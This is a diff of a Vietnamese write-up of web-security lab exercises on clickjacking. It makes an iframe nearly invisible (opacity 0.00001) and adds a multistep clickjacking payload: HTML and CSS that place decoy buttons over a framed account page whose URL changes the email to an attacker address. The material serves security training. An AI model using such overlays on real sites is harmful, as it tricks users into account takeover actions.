@@ -125,7 +125,7 @@ Trong exploit server, ta cấu hình đoạn HTML sau:
   position: relative;
   width: 600px;
   height: 1000px;
-  opacity: 0.9;
+  opacity: 0.00001;
   z-index: 2;
 }
 #decoy_website{
@@ -154,3 +154,49 @@ Trong exploit server, ta cấu hình đoạn HTML sau:
 Sau khi click "Deliver to victim", kết quả thành công.
 
 # 5. Multistep clickjacking
+Để thực hiện multistep clickjacking, ta chỉ cần tạo hai button với label là "Click me first" và "Click me next". Vào exploit server và cấu hình đoạn HTML sau:
+```
+<style>
+#target_website{
+  position: relative;
+  width: 600px;
+  height: 600px;
+  opacity: 0.9;
+  z-index: 2;
+}
+#target_website2{
+  display: none;
+}
+#decoy_website{
+  position: absolute;
+  width: 300px;
+  height: 400px;
+  z-index: 1;
+}
+#click1{
+  width: 148px;
+  height: 34px;
+  position: relative;
+  top: 479px;
+  left: 18px;
+  border-radius: 30px;
+}
+#click2{
+  width: 122px;
+  height: 34px;
+  position: relative;
+  top: 278px;
+  left: 32px;
+  border-radius: 30px;
+}
+</style>
+<body>
+  <div id="decoy_website">
+    <button id="click1">Click me first</button>
+    <button id="click2">Click me next</button>
+  </div>
+  <iframe id="target_website" src="https://0ae8001c0370749ec17208d100490052.web-security-academy.net/my-account?email=attacker@gmail.com"></iframe>
+</body>
+```
+
+Sau khi click "Deliver to victim", bài lab được giải thành công.
